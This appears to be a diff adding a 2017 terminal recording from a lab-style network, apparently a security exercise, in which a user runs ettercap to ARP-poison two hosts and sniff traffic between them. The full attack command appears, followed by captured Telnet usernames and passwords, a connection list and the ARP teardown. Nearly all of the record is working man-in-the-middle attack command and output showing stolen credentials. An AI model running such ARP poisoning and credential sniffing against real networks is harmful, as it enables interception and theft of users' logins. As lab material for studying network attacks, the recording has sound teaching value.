@@ -1,0 +1,150 @@
+Script started on Tue 03 Oct 2017 10:04:33 AM PDT
+jjc400bm@eve:~$ sudo ettercap -Tq -L logDump -i eth0 -M arp:remote /10.1.1.2// /110.1.1.3//
+
+[1mettercap 0.8.2[0m copyright 2001-2015 Ettercap Development Team
+
+Listening on:
+  eth0 -> 00:04:23:C7:A6:34
+	  10.1.1.4/255.255.255.0
+	  fe80::204:23ff:fec7:a634/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
+Privileges dropped to EUID 65534 EGID 65534...
+
+  33 plugins
+  42 protocol dissectors
+  57 ports monitored
+20388 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+/ |=========================>                         |  50.00 %- |==================================================>| 100.00 %* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.1.1.2 00:04:23:C5:DE:64
+
+ GROUP 2 : 10.1.1.3 00:14:22:23:99:52
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jambo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jambo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+
+Inline help:
+
+ [vV]      - change the visualization mode
+ [pP]      - activate a plugin
+ [fF]      - (de)activate a filter
+ [lL]      - print the hosts list
+ [oO]      - print the profiles list
+ [cC]      - print the connections list
+ [sS]      - print interfaces statistics
+ [<space>] - stop/cont printing packets
+ [qQ]      - quit
+
+
+Connections list:
+
+         10.1.1.3:51148 -        10.1.1.2:23    T killed  TX: 105 RX: 1115889
+         10.1.1.3:43568 -        10.1.1.2:443   T killed  TX: 555 RX: 1800
+         10.1.1.3:49690 -        10.1.1.2:80    T closed  TX: 102 RX: 161
+         10.1.1.3:43572 -        10.1.1.2:443   T killed  TX: 555 RX: 1802
+         10.1.1.3:51158 -        10.1.1.2:23    T closed  TX: 130 RX: 17621
+         10.1.1.2:48876 -        10.1.1.3:80    T closed  TX: 89 RX: 18982
+         10.1.1.3:51144 -        10.1.1.2:23    T closed  TX: 134 RX: 15493
+         10.1.1.3:51132 -        10.1.1.2:23    T closed  TX: 32 RX: 1170
+         10.1.1.3:51146 -        10.1.1.2:23    T killed  TX: 60 RX: 1148718
+         10.1.1.3:43574 -        10.1.1.2:443   T killed  TX: 555 RX: 1794
+         10.1.1.2:48878 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.2:48880 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:49696 -        10.1.1.2:80    T closed  TX: 102 RX: 191
+         10.1.1.3:49698 -        10.1.1.2:80    T closed  TX: 102 RX: 182
+         10.1.1.2:48882 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:43580 -        10.1.1.2:443   T killed  TX: 555 RX: 1779
+         10.1.1.3:49702 -        10.1.1.2:80    T closed  TX: 102 RX: 192
+*        10.1.1.3:51176 -        10.1.1.2:23    T killed  TX: 100 RX: 1132614
+         10.1.1.3:49706 -        10.1.1.2:80    T closed  TX: 102 RX: 170
+*        10.1.1.3:51180 -        10.1.1.2:23    T killed  TX: 119 RX: 1161897
+         10.1.1.3:43590 -        10.1.1.2:443   T killed  TX: 555 RX: 1799
+         10.1.1.2:48884 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:43592 -        10.1.1.2:443   T killed  TX: 555 RX: 1774
+         10.1.1.3:49714 -        10.1.1.2:80    T closed  TX: 102 RX: 189
+*        10.1.1.3:51188 -        10.1.1.2:23    T killed  TX: 194 RX: 1171352
+         10.1.1.3:49718 -        10.1.1.2:80    T closed  TX: 102 RX: 161
+         10.1.1.3:49720 -        10.1.1.2:80    T closed  TX: 102 RX: 184
+         10.1.1.3:43602 -        10.1.1.2:443   T killed  TX: 555 RX: 1778
+*        10.1.1.3:51196 -        10.1.1.2:23    T killed  TX: 221 RX: 1180435
+*        10.1.1.3:51198 -        10.1.1.2:23    T active  TX: 163 RX: 20545
+         10.1.1.2:48886 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+*        10.1.1.3:51200 -        10.1.1.2:23    T active  TX: 181 RX: 1928
+         10.1.1.2:48888 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:43610 -        10.1.1.2:443   T killed  TX: 555 RX: 1800
+         10.1.1.3:49732 -        10.1.1.2:80    T closed  TX: 102 RX: 170
+         10.1.1.3:49734 -        10.1.1.2:80    T closed  TX: 102 RX: 187
+         10.1.1.2:48890 -        10.1.1.3:80    T closed  TX: 145 RX: 653
+*        10.1.1.3:51208 -        10.1.1.2:23    T active  TX: 181 RX: 29761
+         10.1.1.2:48892 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:43618 -        10.1.1.2:443   T killed  TX: 555 RX: 1784
+         10.1.1.3:43620 -        10.1.1.2:443   T killed  TX: 555 RX: 1821
+         10.1.1.3:49742 -        10.1.1.2:80    T closed  TX: 102 RX: 181
+         10.1.1.2:48894 -        10.1.1.3:80    T closed  TX: 89 RX: 19475
+         10.1.1.3:43624 -        10.1.1.2:443   T killed  TX: 555 RX: 1817
+         10.1.1.3:49746 -        10.1.1.2:80    T closed  TX: 102 RX: 161
+         10.1.1.3:43628 -        10.1.1.2:443   T killed  TX: 555 RX: 1818
+         10.1.1.3:43630 -        10.1.1.2:443   T killed  TX: 555 RX: 1821
+         10.1.1.2:48896 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.2:48898 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:49752 -        10.1.1.2:80    T closed  TX: 102 RX: 185
+         10.1.1.3:43634 -        10.1.1.2:443   T killed  TX: 555 RX: 1780
+*        10.1.1.3:51228 -        10.1.1.2:23    T active  TX: 91 RX: 1941
+*        10.1.1.3:51230 -        10.1.1.2:23    T active  TX: 89 RX: 14662
+         10.1.1.2:48900 -        10.1.1.3:80    T closed  TX: 146 RX: 654
+         10.1.1.3:49760 -        10.1.1.2:80    T closed  TX: 102 RX: 189
+         10.1.1.3:43642 -        10.1.1.2:443   T killed  TX: 555 RX: 1784
+
+Closing text interface...
+
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+Unified sniffing was stopped.
+
+jjc400bm@eve:~$ end
+No command 'end' found, did you mean:
+ Command 'nd' from package 'nd' (universe)
+ Command 'env' from package 'coreutils' (main)
+ Command 'and' from package 'and' (universe)
+ Command 'esd' from package 'pulseaudio-esound-compat' (universe)
+ Command 'send' from package 'nmh' (universe)
+ Command 'send' from package 'mailutils-mh' (universe)
+ Command 'bnd' from package 'bnd' (universe)
+ Command 'ed' from package 'ed' (main)
+ Command 'eid' from package 'id-utils' (universe)
+ Command 'ent' from package 'ent' (universe)
+ Command 'snd' from package 'snd-gtk-jack' (universe)
+ Command 'snd' from package 'snd-nox' (universe)
+ Command 'snd' from package 'snd-gtk-pulse' (universe)
+end: command not found
+jjc400bm@eve:~$ exit
+exit
+
+Script done on Tue 03 Oct 2017 10:06:30 AM PDT
